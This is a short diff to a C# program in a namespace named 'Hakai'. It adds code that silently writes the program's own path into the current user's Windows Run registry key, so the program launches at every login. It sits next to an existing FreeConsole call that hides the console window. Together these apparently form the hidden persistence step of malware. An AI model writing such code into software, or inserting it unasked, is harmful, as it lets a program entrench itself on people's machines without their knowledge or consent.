@@ -1,4 +1,6 @@
-﻿using System.Runtime.InteropServices;
+﻿using Microsoft.Win32;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
 
 namespace Hakai
 {
@@ -9,6 +11,11 @@ namespace Hakai
 
         static void Main(string[] args)
         {
+            string executablePath = Process.GetCurrentProcess().MainModule.FileName;
+            RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            key.SetValue("Hakai", executablePath);
+            key.Close();
+
             FreeConsole();
             try 
             { 
